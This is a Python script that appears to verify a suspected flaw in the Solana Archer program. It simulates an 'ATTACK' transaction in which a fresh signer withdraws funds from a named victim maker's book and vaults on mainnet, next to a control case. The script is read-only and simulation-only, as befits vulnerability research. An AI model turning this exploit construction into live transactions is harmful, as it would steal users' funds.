#!/usr/bin/env python3
"""Independent Archer MakerWithdrawFunds simulation (Task A).
READ-ONLY: simulateTransaction only, sigVerify=false. No keys, no sends."""
import json, base64, hashlib, sys
from solders.pubkey import Pubkey
from solders.instruction import Instruction, AccountMeta
from solders.message import Message
from solders.transaction import Transaction
from solders.hash import Hash
from solders.signature import Signature
from rpc import rpc, b58encode

ARCHER = Pubkey.from_string("Archer8kgiavM61GyusMzaaS2ft5sALtNsD1HxkUPMhy")
ATA_PROG = Pubkey.from_string("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
SYS = Pubkey.from_string("11111111111111111111111111111111")
TOKENKEG = Pubkey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
TOKEN2022 = Pubkey.from_string("TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb")
PAYER = Pubkey.from_string("AuthYRbdcyksthcB1AM8ZKB3CidzChURkLzsGN8pYUmw")

def fresh_pubkey(tag: str) -> Pubkey:
    return Pubkey.from_bytes(hashlib.sha256(tag.encode()).digest())

def ata(owner: Pubkey, mint: Pubkey, token_prog: Pubkey) -> Pubkey:
    seeds = [bytes(owner), bytes(token_prog), bytes(mint)]
    return Pubkey.find_program_address(seeds, ATA_PROG)[0]

def create_idempotent_ata(payer, owner, mint, token_prog):
    return Instruction(ATA_PROG, bytes([1]), [
        AccountMeta(payer, True, True),
        AccountMeta(ata(owner, mint, token_prog), False, True),
        AccountMeta(owner, False, False),
        AccountMeta(mint, False, False),
        AccountMeta(SYS, False, False),
        AccountMeta(token_prog, False, False),
    ])

def maker_withdraw_ix(market, book, maker, base_mint, quote_mint, base_vault, quote_vault,
                      maker_base_ata, maker_quote_ata, base_tp, quote_tp, authority,
                      market_writable=False, book_writable=False):
    data = bytes([12]) + (0).to_bytes(8, "little") + (1).to_bytes(8, "little")
    metas = [
        AccountMeta(market, False, market_writable),
        AccountMeta(book, False, book_writable),
        AccountMeta(maker, True, True),
        AccountMeta(base_mint, False, False),
        AccountMeta(quote_mint, False, False),
        AccountMeta(base_vault, False, True),
        AccountMeta(quote_vault, False, True),
        AccountMeta(maker_base_ata, False, True),
        AccountMeta(maker_quote_ata, False, True),
        AccountMeta(base_tp, False, False),
        AccountMeta(quote_tp, False, False),
        AccountMeta(authority, True, False),
    ]
    return Instruction(ARCHER, data, metas)

def simulate(ixs, label):
    msg = Message.new_with_blockhash(ixs, PAYER, Hash.default())
    tx = Transaction.populate(msg, [Signature.default()] * msg.header.num_required_signatures)
    raw = base64.b64encode(bytes(tx)).decode()
    res = rpc("simulateTransaction", [raw, {"encoding": "base64", "sigVerify": False,
                                            "replaceRecentBlockhash": True,
                                            "commitment": "processed"}])
    print("\n===== SIM:", label, "=====")
    if not isinstance(res, dict) or "value" not in res:
        print("RPC ERROR:", json.dumps(res)[:800])
        return res
    v = res["value"]
    print("err:", json.dumps(v.get("err")))
    print("unitsConsumed:", v.get("unitsConsumed"))
    logs = v.get("logs") or []
    for l in logs:
        print("  log:", l)
    return res

def account_owner(pk: Pubkey):
    r = rpc("getAccountInfo", [str(pk), {"encoding": "base64"}])
    try:
        return r["value"]["owner"]
    except Exception:
        return None

def main():
    victim = Pubkey.from_string(sys.argv[1]) if len(sys.argv) > 1 else Pubkey.from_string("GLKCuotKSjPtQhxHmf6q8GUkw6tUZnzs8W5vEbxdaBdK")
    market = Pubkey.from_string(sys.argv[2]) if len(sys.argv) > 2 else Pubkey.from_string("BZDUzrgR1ns4PykkvHCorxfsg9M3zc9a7xbztv3kjfCC")
    book = Pubkey.from_string(sys.argv[3]) if len(sys.argv) > 3 else Pubkey.from_string("939Pgm7Jz3E8PuTZsXEK4fAf5EpUGPpPqf4dpALkTwmu")
    base_mint = Pubkey.from_string(sys.argv[4]) if len(sys.argv) > 4 else Pubkey.from_string("USDvUSpnhCr9yBgj3UyVrD239HRUv4RsHwH2FxsWuMk")
    quote_mint = Pubkey.from_string(sys.argv[5]) if len(sys.argv) > 5 else Pubkey.from_string("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v")
    _mk = {m["market"]: m for m in json.load(open("markets.json"))}
    _m = _mk[str(market)]
    base_vault = Pubkey.from_string(sys.argv[6]) if len(sys.argv) > 6 else Pubkey.from_string(_m["base_vault"])
    quote_vault = Pubkey.from_string(sys.argv[7]) if len(sys.argv) > 7 else Pubkey.from_string(_m["quote_vault"])

    print("victim maker:", victim)
    print("market:", market, "book:", book)
    print("base_mint:", base_mint, "owner:", account_owner(base_mint))
    print("quote_mint:", quote_mint, "owner:", account_owner(quote_mint))
    base_tp = Pubkey.from_string(account_owner(base_mint))
    quote_tp = Pubkey.from_string(account_owner(quote_mint))
    print("base_tp:", base_tp, "quote_tp:", quote_tp)

    attacker = fresh_pubkey("hylo-verify-attacker-1")
    print("attacker(fresh):", attacker)

    # ---- CASE (i) ATTACK: fresh signer + victim's book ----
    ixs = []
    ixs.append(create_idempotent_ata(PAYER, attacker, base_mint, base_tp))
    ixs.append(create_idempotent_ata(PAYER, attacker, quote_mint, quote_tp))
    ixs.append(maker_withdraw_ix(market, book, attacker, base_mint, quote_mint, base_vault, quote_vault,
                                 ata(attacker, base_mint, base_tp), ata(attacker, quote_mint, quote_tp),
                                 base_tp, quote_tp, attacker))
    attack_res = simulate(ixs, "ATTACK fresh-signer + victim book")

    # ---- CASE (ii) CONTROL: victim signer + victim's own book ----
    ixs2 = []
    ixs2.append(create_idempotent_ata(PAYER, victim, base_mint, base_tp))
    ixs2.append(create_idempotent_ata(PAYER, victim, quote_mint, quote_tp))
    ixs2.append(maker_withdraw_ix(market, book, victim, base_mint, quote_mint, base_vault, quote_vault,
                                  ata(victim, base_mint, base_tp), ata(victim, quote_mint, quote_tp),
                                  base_tp, quote_tp, victim))
    control_res = simulate(ixs2, "CONTROL victim-signer + victim book")

    # ---- CASE (iii) ATTACK2: fresh signer + victim's book, but maker=authority=victim? no ----
    # Extra probe: does a wrong-market book fail differently?
    out = {"attack": attack_res, "control": control_res,
           "victim": str(victim), "market": str(market), "book": str(book),
           "attacker": str(attacker)}
    with open("sim_taskA.json", "w") as f:
        json.dump(out, f, indent=2)

if __name__ == "__main__":
    main()
